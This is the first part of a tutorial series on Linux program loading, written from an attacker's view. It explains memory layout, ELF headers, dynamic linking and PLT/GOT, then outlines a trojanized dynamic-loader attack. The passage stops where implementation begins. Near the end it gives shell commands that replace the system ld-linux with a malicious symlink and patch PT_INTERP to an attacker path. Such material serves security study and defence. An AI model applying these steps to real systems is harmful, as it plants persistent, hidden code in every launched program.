# Deep Dive into Linux Program Loading: Understanding the Internals to Abuse Them

## A Comprehensive Series on Loader & Linker Level Attacks

**Part 1: Understanding the Foundation & The Trojanized Loader Attack**
---

## Series Overview

Welcome to an in-depth exploration of **Loader & Linker Level Attacks** on Linux systems. This series focuses on **understanding how Linux loads and executes programs** - knowledge that reveals powerful abuse vectors operating at levels most security tools don't monitor.

This is not about memory corruption or traditional exploitation. This is about understanding the **design and mechanisms** of program loading deeply enough to subvert them.

**The Philosophy:** When you deeply understand how a system works, you discover ways to make it work for you - even in ways its designers never intended.

### What This Series Covers

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         SERIES ROADMAP                                          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Part 1  (This Article) - Foundation & Trojanized Loader          ✓ COMPLETE  │
│   Part 2  - LD_PRELOAD Injection                                   ✓ COMPLETE  │
│   Part 3  - GOT/PLT Hijacking                                      ✓ COMPLETE  │
│   Part 4  - DT_RPATH / DT_RUNPATH Exploitation                     ✓ COMPLETE  │
│   Part 5  - DT_DEBUG Exploitation                                  ✓ COMPLETE  │
│   Part 6  - .init_array / .fini_array Injection                    ✓ COMPLETE  │
│   Part 7  - Symbol Versioning Attacks                              ✓ COMPLETE  │
│   Part 8  - DT_NEEDED Injection                                    ✓ COMPLETE  │
│   Part 9  - LD_AUDIT Interface Abuse                               ✓ COMPLETE  │
│   Part 10 - IFUNC Resolver Hijacking                               ✓ COMPLETE  │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│   ALL 10 PARTS COMPLETED - Full coverage of loader/linker attack surface!       │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Why These Attacks Matter

All attacks in this series share a critical characteristic: they execute malicious code **before the target program's `main()` function runs**. This means:

- Security checks in the program haven't initialized yet
- No application-level logging has started
- The program runs "normally" after the attack - completely transparent to the user
- Traditional antivirus focusing on the application layer may miss these entirely

---

# 1. Memory Layout - How Programs Organize Space

Understanding how a running program organizes its memory is foundational to understand **what lives where** and **why the system trusts certain regions**.

1. **WHERE** things are stored in memory
2. **HOW** they are organized
3. **WHAT** protections exist
4. **WHY** certain memory regions have specific permissions

Think of memory as a building with different floors. Each floor has a purpose, and understanding the layout tells you how the system's trust model works.

## 1.1 The Virtual Address Space

When a program runs, the operating system creates a **virtual address space** for it. This is an abstraction - your program thinks it has access to a huge contiguous block of memory, but the OS maps this to physical RAM as needed.

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                     VIRTUAL ADDRESS SPACE                                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   32-bit process: 0x00000000 to 0xFFFFFFFF (4 GB total)                         │
│                   └── User space: ~3 GB                                         │
│                   └── Kernel space: ~1 GB                                       │
│                                                                                 │
│   64-bit process: 0x0000000000000000 to 0x00007FFFFFFFFFFF (128 TB user space)  │
│                   └── Kernel space starts at 0xFFFF800000000000                 │
│                                                                                 │
│   KEY INSIGHT: User programs operate in user space.                             │
│                The kernel manages the mapping between virtual and physical.     │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 1.2 Memory Segments - The Building's Floors

A typical Linux process has these segments (from LOW to HIGH addresses):

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    COMPLETE MEMORY LAYOUT                                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   +---------------------------+ 0x00000000 (lowest address)                     │
│   |       NULL PAGE           |  ← Unmapped, accessing = SEGFAULT               │
│   +---------------------------+                                                 │
│   |                           |                                                 │
│   |    TEXT (Code)            |  ← Your program's machine code                  │
│   |    Permissions: r-x       |    All functions live here                      │
│   |                           |    ★ READ + EXECUTE, but NOT WRITABLE ★         │
│   +---------------------------+                                                 │
│   |                           |                                                 │
│   |    RODATA                 |  ← Read-Only Data (string literals)             │
│   |    Permissions: r--       |    "Hello World" strings                        │
│   |                           |                                                 │
│   +---------------------------+                                                 │
│   |                           |                                                 │
│   |    DATA                   |  ← Initialized global/static variables          │
│   |    Permissions: rw-       |    int global_var = 42;                         │
│   |                           |    ★ GOT LIVES HERE - OVERWRITE TARGET ★        │
│   +---------------------------+                                                 │
│   |                           |                                                 │
│   |    BSS                    |  ← Uninitialized global/static variables        │
│   |    Permissions: rw-       |    int global_array[1000];                      │
│   |                           |                                                 │
│   +---------------------------+                                                 │
│   |                           |                                                 │
│   |    HEAP                   |  ← Dynamic memory (malloc/new)                  │
│   |    Permissions: rw-       |    ★ GROWS UPWARD ★                             │
│   |           |               |                                                 │
│   |           v               |                                                 │
│   |                           |                                                 │
│   |        (unused)           |                                                 │
│   |                           |                                                 │
│   |           ^               |                                                 │
│   |           |               |                                                 │
│   |    STACK                  |  ← Local variables, function call info          │
│   |    Permissions: rw-       |    ★ GROWS DOWNWARD toward lower addresses ★    │
│   |                           |                                                 │
│   +---------------------------+                                                 │
│   |    Kernel Space           |  ← Off limits to user programs                  │
│   +---------------------------+ 0x7FFFFFFF (highest user address, 32-bit)       │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 1.3 Why Each Segment's Design Matters

### TEXT Segment (Code) - The Instruction Repository

```
Permissions: r-x (Read + Execute, NO Write)
Contains:    Compiled machine code (your functions)
```

**What's here:**
- The `main()` function and all other program functions
- PLT (Procedure Linkage Table) entries for library calls

**Design Implication:**
The TEXT segment is intentionally **not writable** at runtime. The system trusts that code won't change. But what if we could influence **which code** gets loaded in the first place? That's what loader-level attacks achieve.

### DATA Segment - Where Writable Structures Live

```
Permissions: rw- (Read + Write)
Contains:    Initialized global and static variables
```

**Critical structures here:**
- **GOT (Global Offset Table)** - Contains resolved library function addresses
- **.init_array** - Function pointers called during initialization
- **.fini_array** - Function pointers called during shutdown

**Design Implication:**
These structures are **writable** and contain **addresses the program jumps to**. They exist here because the dynamic linker needs to fill them in at runtime. This design decision creates attack surface.

### STACK Segment - Function Call Mechanics

```
Permissions: rw- (Read + Write)
Contains:    Local variables, function call information
Growth:      DOWNWARD (toward lower addresses)
```

The stack manages function calls - every call creates a **stack frame**:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         STACK FRAME STRUCTURE                                    │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   HIGH ADDRESSES                                                                │
│   +---------------------------+                                                 │
│   | Caller's Stack Frame      |                                                 │
│   +---------------------------+                                                 │
│   | Function Arguments        |                                                 │
│   +---------------------------+                                                 │
│   | Return Address            |  ← Where to continue after function returns     │
│   +---------------------------+                                                 │
│   | Saved Base Pointer (RBP)  |  ← Previous frame pointer                       │
│   +---------------------------+ ← Current RBP points here                       │
│   | Local Variables           |                                                 │
│   +---------------------------+ ← Current RSP points here                       │
│   LOW ADDRESSES                                                                 │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

**Note:** For loader-level attacks, the stack is less relevant since we operate before user code runs.

## 1.4 Viewing Memory Layout in Practice

### Method 1: /proc/PID/maps (Runtime View)

```bash
$ cat /proc/self/maps

# Example output (annotated):
555555554000-555555555000 r--p ...  /path/to/binary  ← ELF header
555555555000-555555556000 r-xp ...  /path/to/binary  ← TEXT (code)
555555556000-555555557000 r--p ...  /path/to/binary  ← RODATA
555555557000-555555558000 rw-p ...  /path/to/binary  ← DATA/BSS
555555558000-555555579000 rw-p ...  [heap]           ← HEAP
7ffff7c00000-7ffff7c28000 r--p ...  /lib/libc.so.6   ← libc
# ...
7ffffffde000-7ffffffff000 rw-p ...  [stack]          ← STACK
```

**Permission flags decoded:**
- `r` = readable
- `w` = writable
- `x` = executable
- `p` = private (copy-on-write)
- `s` = shared

### Method 2: readelf (Static Analysis)

```bash
$ readelf -l binary      # Program headers (segments)
$ readelf -S binary      # Section headers
```

### Method 3: GDB with pwndbg/GEF

```bash
$ gdb ./binary
(gdb) start           # Run until main
(gdb) vmmap           # pwndbg command - shows memory map
(gdb) info proc mappings  # GDB native
```

---

# 2. ELF Program Headers - The Binary's Blueprint

When you run `readelf -l binary`, you see the **program headers** - the blueprint for how the OS loads your binary into memory. Understanding this is crucial for loader-level attacks.

## 2.1 The Header Information

```
Elf file type is DYN (Position-Independent Executable file)
Entry point 0x1040
There are 13 program headers, starting at offset 64
```

| Field | Meaning |
|-------|---------|
| **ELF file type: DYN** | Position-Independent Executable (PIE). Address randomized at runtime. |
| **Entry point: 0x1040** | First instruction executed (it's `_start`, NOT `main`!) |
| **13 program headers** | 13 segments defined for this binary |

### ELF Types

| Type | Meaning | Address Behavior |
|------|---------|------------------|
| `EXEC` | Fixed-address executable | Binary loads at predictable address |
| `DYN` | Position-independent (PIE) | Binary address randomized at runtime (ASLR) |

## 2.2 Critical Program Headers Explained

### PT_INTERP - The Dynamic Linker Path

```
INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
               0x000000000000001c 0x000000000000001c  R      0x1
    [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
```

This is **THE KEY** for our first attack. The kernel reads this path and loads that program to handle dynamic linking.

**Critical Insight:** The kernel **blindly trusts** this path. If we can change it to point to a malicious loader, our code runs before EVERYTHING.

### PT_LOAD Segments - What Gets Mapped

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    LOAD SEGMENTS BREAKDOWN                                       │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   LOAD  vaddr=0x1000  flags=R E    ← TEXT SEGMENT                               │
│         Contains: .init, .plt, .text, .fini                                     │
│         Permissions: Read + Execute                                             │
│                                                                                 │
│   ─────────────────────────────────────────────────────────────────────────     │
│                                                                                 │
│   LOAD  vaddr=0x2000  flags=R      ← RODATA SEGMENT                             │
│         Contains: .rodata (string literals, constants)                          │
│         Permissions: Read only                                                  │
│                                                                                 │
│   ─────────────────────────────────────────────────────────────────────────     │
│                                                                                 │
│   LOAD  vaddr=0x3df0  flags=RW     ← DATA SEGMENT                               │
│         Contains: .init_array, .fini_array, .dynamic, .got, .data, .bss         │
│         Permissions: Read + Write                                               │
│                                                                                 │
│         ★ This segment contains structures the linker WRITES to ★               │
│         ★ Including function pointers that get CALLED ★                         │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### GNU_STACK - Stack Permissions

```
GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
               0x0000000000000000 0x0000000000000000  RW     0x10
                                                     ^^
                                                     RW = Read/Write only
```

This defines stack permissions:

| Flags | Meaning | Description |
|-------|---------|-------------|
| `RW` | Stack NOT executable | Standard modern configuration (NX enabled) |
| `RWX` | Stack IS executable | Legacy configuration (rarely seen today) |

```bash
# Check stack permissions:
$ readelf -l binary | grep GNU_STACK
```

### GNU_RELRO - GOT Protection

```
GNU_RELRO      0x0000000000002df0 0x0000000000003df0 0x0000000000003df0
               0x0000000000000210 0x0000000000000210  R      0x1
```

Marks parts of GOT as read-only **AFTER** relocations complete:

| Level | GOT Writable? | How to Compile |
|-------|---------------|----------------|
| No RELRO | Always writable | `gcc -Wl,-z,norelro` |
| Partial RELRO | Partially writable | `gcc -Wl,-z,relro` (default) |
| Full RELRO | Read-only after start | `gcc -Wl,-z,relro,-z,now` |

## 2.3 Visual: File vs Memory Mapping

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    FILE vs MEMORY MAPPING                                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   FILE (on disk)                         MEMORY (at runtime)                    │
│   ──────────────                         ──────────────────                     │
│   ┌──────────────────┐                   ┌────────────────────────────┐         │
│   │ ELF Header       │                   │ 0x0000: Headers (R)        │         │
│   │ Program Headers  │───────────────────│   - ELF header             │         │
│   │ (PHDR)           │                   │   - Program headers        │         │
│   ├──────────────────┤                   ├────────────────────────────┤         │
│   │ .text            │                   │ 0x1000: TEXT (R-X)         │         │
│   │ .plt             │───────────────────│   - .plt (PLT stubs)       │         │
│   │ .init            │                   │   - .text (your code)      │         │
│   │ .fini            │                   │   - .init/.fini            │         │
│   ├──────────────────┤                   ├────────────────────────────┤         │
│   │ .rodata          │───────────────────│ 0x2000: RODATA (R--)       │         │
│   │ .eh_frame        │                   │   - String literals        │         │
│   ├──────────────────┤                   ├────────────────────────────┤         │
│   │ .data            │                   │ 0x3000: DATA (RW-)         │         │
│   │ .got             │───────────────────│   - .got (GOT entries)     │         │
│   │                  │                   │   - .data (globals)        │         │
│   │                  │   (zeroed)────────│   - .bss (zeroed globals)  │         │
│   └──────────────────┘                   ├────────────────────────────┤         │
│                                          │        (unmapped)          │         │
│                                          ├────────────────────────────┤         │
│                                          │ HEAP (grows upward ↑)      │         │
│                                          │   - malloc'd memory        │         │
│                                          ├────────────────────────────┤         │
│                                          │        (unmapped)          │         │
│                                          ├────────────────────────────┤         │
│                                          │ STACK (grows downward ↓)   │         │
│                                          │   - Local variables        │         │
│                                          │   - Return addresses       │         │
│                                          └────────────────────────────┘         │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

# 3. Process Execution Flow - From Command to Code

Understanding what happens when you type `./program` is crucial. This is where loader-level attacks insert themselves.

## 3.1 The Complete Execution Timeline

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         PROCESS EXECUTION TIMELINE                               │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   YOU TYPE: ./program                                                           │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐      │
│   │   KERNEL    │───▶│   LOADER    │───▶│   LINKER    │───▶│  YOUR CODE  │      │
│   │  (execve)   │    │ (ld-linux)  │    │  (resolves) │    │   (main)    │      │
│   └─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘      │
│                                                                                 │
│   1. Load ELF        2. Map segments     3. Resolve         4. Jump to          │
│      into memory        into memory         symbols            _start           │
│                                                                                 │
│   ════════════════════════════════════════════════════════════════════════════  │
│                                                                                 │
│                   ★ LOADER-LEVEL ATTACKS EXECUTE HERE ★                         │
│                      (Before main() ever runs!)                                 │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 3.2 Phase 1: Shell to Kernel

When you type `./program`, your shell does:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                           SHELL → KERNEL                                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Shell (bash):                                                                 │
│       1. fork()     → Creates child process                                     │
│       2. execve()   → Replaces child with your program                          │
│                                                                                 │
│   execve("./program", argv[], envp[])                                           │
│        │                                                                        │
│        └─────────────────────────────────────────────────────┐                  │
│                                                              ▼                  │
│   ┌──────────────────────────────────────────────────────────────────┐          │
│   │                           KERNEL                                 │          │
│   ├──────────────────────────────────────────────────────────────────┤          │
│   │                                                                  │          │
│   │   1. Open the file "./program"                                   │          │
│   │   2. Read ELF header (first 64 bytes)                            │          │
│   │   3. Check: Is it executable? Correct architecture?              │          │
│   │   4. Read program headers (LOAD segments)                        │          │
│   │   5. Create new memory space for process                         │          │
│   │   6. Map segments into memory                                    │          │
│   │   7. Find PT_INTERP segment → "/lib64/ld-linux-x86-64.so.2"      │          │
│   │   8. Load the dynamic linker                                     │          │
│   │   9. Jump to INTERPRETER's entry point (NOT program's!)          │          │
│   │                                                                  │          │
│   │   ★ CRITICAL: Kernel trusts whatever path is in PT_INTERP ★      │          │
│   │                                                                  │          │
│   └──────────────────────────────────────────────────────────────────┘          │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 3.3 Phase 2: Dynamic Linker Takes Over

The kernel doesn't run your program directly. It first hands control to the **dynamic linker**:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    DYNAMIC LINKER (ld-linux.so)                                  │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Kernel jumps here first, NOT to your main()!                                  │
│                                                                                 │
│   Tasks:                                                                        │
│   ┌────────────────────────────────────────────────────────────────────────┐    │
│   │ 1. Read DYNAMIC segment from your binary                               │    │
│   │    - Find list of needed libraries (DT_NEEDED)                         │    │
│   │    - Find symbol tables (DT_SYMTAB)                                    │    │
│   │    - Find relocation tables (DT_RELA)                                  │    │
│   └────────────────────────────────────────────────────────────────────────┘    │
│                              │                                                  │
│                              ▼                                                  │
│   ┌────────────────────────────────────────────────────────────────────────┐    │
│   │ 2. Load required shared libraries                                      │    │
│   │    - libc.so.6 (printf, malloc, etc.)                                  │    │
│   │    - libpthread.so (if threaded)                                       │    │
│   │    - Any other libraries your program needs                            │    │
│   └────────────────────────────────────────────────────────────────────────┘    │
│                              │                                                  │
│                              ▼                                                  │
│   ┌────────────────────────────────────────────────────────────────────────┐    │
│   │ 3. Perform relocations                                                 │    │
│   │    - Fill in GOT entries (for lazy binding)                            │    │
│   │    - Or resolve all symbols now (if BIND_NOW)                          │    │
│   └────────────────────────────────────────────────────────────────────────┘    │
│                              │                                                  │
│                              ▼                                                  │
│   ┌────────────────────────────────────────────────────────────────────────┐    │
│   │ 4. Run initialization functions                                        │    │
│   │    - .preinit_array functions                                          │    │
│   │    - Library .init_array functions                                     │    │
│   │    - Program .init_array functions                                     │    │
│   └────────────────────────────────────────────────────────────────────────┘    │
│                              │                                                  │
│                              ▼                                                  │
│   ┌────────────────────────────────────────────────────────────────────────┐    │
│   │ 5. Jump to your program's _start → main()                              │    │
│   └────────────────────────────────────────────────────────────────────────┘    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 3.4 Phase 3: PLT/GOT - How Library Calls Work

When your code calls a library function like `printf()`, here's what happens:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         PLT/GOT MECHANISM                                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   YOUR CODE              PLT (Executable)         GOT (Writable)                │
│   ──────────             ─────────────────         ──────────────               │
│                                                                                 │
│   main:                  printf@plt:              printf@got:                   │
│     ...                    jmp [printf@got] ─────▶ 0x7ffff7e5e420              │
│     call printf@plt ───▶   push 0                  (libc printf addr)          │
│     ...                    jmp resolver                                         │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│                                                                                 │
│   FIRST CALL (Lazy Binding):                                                    │
│   ──────────────────────────                                                    │
│   1. call printf@plt                                                            │
│   2. jmp [printf@got] → GOT initially points back to PLT+6                      │
│   3. push relocation index                                                      │
│   4. jmp resolver (_dl_runtime_resolve)                                         │
│   5. Resolver finds printf in libc, writes address to GOT                       │
│   6. Jump to real printf                                                        │
│                                                                                 │
│   SUBSEQUENT CALLS (Fast Path):                                                 │
│   ─────────────────────────────                                                 │
│   1. call printf@plt                                                            │
│   2. jmp [printf@got] → GOT now contains real address                           │
│   3. Direct jump to libc printf (no resolver needed)                            │
│                                                                                 │
│   ═══════════════════════════════════════════════════════════════════════════   │
│                                                                                 │
│   WHY THIS MATTERS FOR ATTACKS:                                                 │
│   ──────────────────────────────                                                │
│                                                                                 │
│   The GOT is WRITABLE. If you can overwrite printf@got:                         │
│                                                                                 │
│   BEFORE:  printf@got → 0x7ffff7c60100 (real printf)                            │
│   AFTER:   printf@got → 0x401234 (your evil function!)                          │
│                                                                                 │
│   Next call to printf() → YOUR code runs!                                       │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 3.5 Complete Execution Flow Visualization

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        COMPLETE EXECUTION FLOW                                   │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   ./program                                                                     │
│       │                                                                         │
│       ▼                                                                         │
│   ┌─────────┐    ┌─────────────┐    ┌───────────────────────────────────┐       │
│   │ KERNEL  │───▶│ Load ELF    │───▶│ Map LOAD segments to memory       │       │
│   │ execve  │    │ headers     │    │ (TEXT, DATA, BSS, etc.)           │       │
│   └─────────┘    └─────────────┘    └───────────────────────────────────┘       │
│                                                    │                            │
│                                                    ▼                            │
│                        ┌───────────────────────────────────────────────┐        │
│                        │ DYNAMIC LINKER (ld-linux.so)                  │        │
│                        │  - Load libc.so, other libraries              │        │
│                        │  - Set up PLT/GOT for lazy binding            │        │
│                        │  - Run .init_array functions                  │        │
│                        │  - Jump to _start                             │        │
│                        └───────────────────────────────────────────────┘        │
│                                                    │                            │
│                                                    ▼                            │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │                          YOUR PROGRAM                                   │   │
│   │                                                                         │   │
│   │  _start ──▶ __libc_start_main ──▶ main()                                │   │
│   │                                      │                                  │   │
│   │                                      ▼                                  │   │
│   │                              ┌─────────────┐                            │   │
│   │                              │ Your code   │                            │   │
│   │                              │ runs here   │                            │   │
│   │                              └─────────────┘                            │   │
│   │                                      │                                  │   │
│   │              ┌───────────────────────┼───────────────────────┐          │   │
│   │              ▼                       ▼                       ▼          │   │
│   │   ┌──────────────────┐    ┌──────────────────┐    ┌──────────────┐      │   │
│   │   │ Library calls    │    │ Heap allocation  │    │ Stack usage  │      │   │
│   │   │ (via PLT/GOT)    │    │ (malloc/free)    │    │ (locals)     │      │   │
│   │   └──────────────────┘    └──────────────────┘    └──────────────┘      │   │
│   │                                                                         │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│                                      │                                          │
│                                      ▼                                          │
│                              ┌─────────────┐                                    │
│                              │ exit()      │                                    │
│                              │ .fini_array │                                    │
│                              │ Return to   │                                    │
│                              │ kernel      │                                    │
│                              └─────────────┘                                    │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

# 4. The Attack Surface - Where We Strike

Now that you understand how programs load and execute, let's examine the attack surface at the loader/linker level.

## 4.1 Attack Surface Overview

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    DYNAMIC LINKER ATTACK SURFACE                                 │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   ENVIRONMENT VARIABLES                    ELF STRUCTURES                       │
│   ─────────────────────                    ──────────────                       │
│   ┌─────────────────────┐                  ┌─────────────────────┐              │
│   │ LD_PRELOAD          │──────────────────│ PT_INTERP           │              │
│   │ LD_LIBRARY_PATH     │                  │ (Trojanized Loader) │ ★ THIS PART ★│
│   │ LD_AUDIT            │                  └─────────────────────┘              │
│   │ LD_DEBUG            │                                                       │
│   └─────────────────────┘                  ┌─────────────────────┐              │
│            │                               │ DYNAMIC Segment     │              │
│            │                               │  ├─ DT_NEEDED       │              │
│            ▼                               │  ├─ DT_RPATH        │              │
│   ┌─────────────────────┐                  │  ├─ DT_RUNPATH      │              │
│   │ Processed by        │                  │  ├─ DT_INIT         │              │
│   │ ld-linux.so at      │◀─────────────────│  ├─ DT_INIT_ARRAY   │              │
│   │ program startup     │                  │  ├─ DT_PREINIT_ARR  │              │
│   └─────────────────────┘                  │  └─ DT_SYMTAB       │              │
│            │                               └─────────────────────┘              │
│            │                                                                    │
│            ▼                               ┌─────────────────────┐              │
│   ┌─────────────────────┐                  │ .got.plt Section    │              │
│   │ Library Loading     │                  │ (Runtime writable)  │              │
│   │ Symbol Resolution   │─────────────────▶│                     │              │
│   │ Relocation          │                  └─────────────────────┘              │
│   └─────────────────────┘                                                       │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 4.2 Attack Catalog - Complete Series Overview

| Part | Attack | Target | Requires | Status |
|------|--------|--------|----------|--------|
| **1** | **Trojanized Loader** | PT_INTERP | Root or file write | ✓ Complete |
| **2** | **LD_PRELOAD Injection** | Environment | Process control | ✓ Complete |
| **3** | **GOT/PLT Hijacking** | .got.plt | Memory write primitive | ✓ Complete |
| **4** | **DT_RPATH/RUNPATH Exploitation** | Library search path | Write to searched paths | ✓ Complete |
| **5** | **DT_DEBUG Exploitation** | r_debug structure | Process memory access | ✓ Complete |
| **6** | **.init/.fini Array Injection** | DT_INIT/FINI_ARRAY | Binary modification | ✓ Complete |
| **7** | **Symbol Versioning Attacks** | .gnu.version sections | LD_PRELOAD or binary mod | ✓ Complete |
| **8** | **DT_NEEDED Injection** | Library dependency list | patchelf or binary mod | ✓ Complete |
| **9** | **LD_AUDIT Interface Abuse** | rtld-audit callbacks | Environment control | ✓ Complete |
| **10** | **IFUNC Resolver Hijacking** | Resolver functions | LD_PRELOAD | ✓ Complete |

## 4.3 Why These Attacks Are Powerful

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    WHY LOADER-LEVEL ATTACKS ARE DANGEROUS                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   1. PRE-EXECUTION CONTROL                                                      │
│      ─────────────────────────                                                  │
│      Malicious code runs BEFORE:                                                │
│        - Program's _start                                                       │
│        - Program's main()                                                       │
│        - Any library initialization                                             │
│        - Any security checks in the program                                     │
│                                                                                 │
│      Timeline:                                                                  │
│      ──────────────────────────────────────────────────────────────────────►    │
│      │ Kernel │ EVIL │ ld-linux │ libc init │ _start │ main │ program │        │
│                 ▲                                                               │
│                 └── Our code runs HERE                                          │
│                                                                                 │
│   2. TRANSPARENCY                                                               │
│      ─────────────                                                              │
│      After payload execution:                                                   │
│        - Program runs completely normally                                       │
│        - User sees expected output                                              │
│        - No crashes, no warnings                                                │
│        - Logs show normal execution                                             │
│                                                                                 │
│   3. PERSISTENCE                                                                │
│      ───────────                                                                │
│        - Survives reboots (modifications are on disk)                           │
│        - Affects every execution of the target                                  │
│        - Some variants affect ALL programs on the system                        │
│                                                                                 │
│   4. STEALTH                                                                    │
│      ───────                                                                    │
│        - No runtime memory anomalies after initial execution                    │
│        - Can hide files, processes, network connections                         │
│        - Traditional AV focuses on application layer                            │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

# 5. THE ATTACK - Trojanized Dynamic Loader

Now we apply everything we've learned. The **Trojanized Loader Attack** modifies the dynamic linker itself to execute malicious code before ANY dynamically-linked program runs.

## 5.1 Attack Overview

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        TROJANIZED LOADER ATTACK FLOW                             │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   User runs: ./program                                                          │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ KERNEL: Reads ELF headers, finds PT_INTERP segment                      │   │
│   │         PT_INTERP points to: /path/to/ld-trojanized.so.2                │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ KERNEL: Loads trojanized loader into memory                             │   │
│   │         Jumps to loader's entry point (0x1f540)                         │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ TROJANIZED LOADER: Entry point hijacked!                                │   │
│   │                                                                         │   │
│   │   0x1f540: JMP 0x2b1a0  ──────────────────────────────────┐             │   │
│   │                                                            │             │   │
│   │   0x2b1a0: ┌──────────────────────────────────────────┐   │             │   │
│   │            │ ★ MALICIOUS SHELLCODE EXECUTES ★         │◀──┘             │   │
│   │            │   - Creates /tmp/PWNED_BY_LOADER         │                 │   │
│   │            │   - Could do ANYTHING here               │                 │   │
│   │            │   - Keylogger, backdoor, credential theft│                 │   │
│   │            └──────────────────────────────────────────┘                 │   │
│   │                         │                                               │   │
│   │                         ▼                                               │   │
│   │            Execute original entry code                                  │   │
│   │            JMP back to 0x1f548 (continue normal flow)                   │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ NORMAL LOADER BEHAVIOR: Loads libc, resolves symbols                    │   │
│   │                         Jumps to program's _start                       │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│        │                                                                        │
│        ▼                                                                        │
│   ┌─────────────────────────────────────────────────────────────────────────┐   │
│   │ PROGRAM: Runs completely normally                                       │   │
│   │          User sees expected output                                      │   │
│   │          NO indication of compromise                                    │   │
│   └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 5.2 Attack Vectors

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         ATTACK VECTORS                                           │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   VECTOR 1: Replace System Loader (requires root)                               │
│   ───────────────────────────────────────────────                               │
│                                                                                 │
│   /lib64/ld-linux-x86-64.so.2 ──▶ Trojanized version                            │
│                                                                                 │
│   Impact: ALL dynamically-linked programs affected                              │
│   Stealth: High (no per-binary modifications)                                   │
│                                                                                 │
│   ─────────────────────────────────────────────────────────────────────────     │
│                                                                                 │
│   VECTOR 2: Patch Binary's PT_INTERP (user or root) ★ OUR APPROACH ★            │
│   ─────────────────────────────────────────────────                             │
│                                                                                 │
│   Original:  PT_INTERP → /lib64/ld-linux-x86-64.so.2                            │
│   Modified:  PT_INTERP → /home/attacker/.hidden/evil-ld.so                      │
│                                                                                 │
│   Impact: Only modified binaries affected                                       │
│   Stealth: Lower (INTERP path is visible in binary)                             │
│                                                                                 │
│   ─────────────────────────────────────────────────────────────────────────     │
│                                                                                 │
│   VECTOR 3: Symlink Hijack (requires root)                                      │
│   ────────────────────────────────────────                                      │
│                                                                                 │
│   mv /lib64/ld-linux-x86-64.so.2 /lib64/ld-linux-x86-64.so.2.bak                │
│   ln -s /path/to/evil-ld.so /lib64/ld-linux-x86-64.so.2                         │
│                                                                                 │
│   Impact: All programs, like Vector 1                                           │
│   Stealth: Medium (symlink is visible)                                          │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

## 5.3 Implementation: Finding a Code Cave

The first step is finding unused space in the loader binary where we can inject our payload. ELF segments are page-aligned (4096 bytes), and the padding between sections is often filled with zeros - perfect for our code.

```
┌─────────────────────────────────────────────────────────────────────────────────┐
